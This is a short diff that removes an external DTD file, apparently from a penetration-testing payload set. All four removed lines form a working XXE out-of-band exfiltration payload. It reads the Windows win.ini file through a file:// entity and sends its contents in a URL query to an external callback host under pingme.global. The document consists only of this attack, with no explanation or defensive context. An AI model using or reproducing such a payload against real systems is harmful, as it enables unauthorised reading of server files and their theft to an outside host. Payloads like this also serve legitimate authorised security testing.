@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///C:\windows\win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://x0yeial1xn33vt6xpwpe71vtnktbh85x.bsc.pingme.global/?x=%file;'>">
-%eval;
-%exfil;  
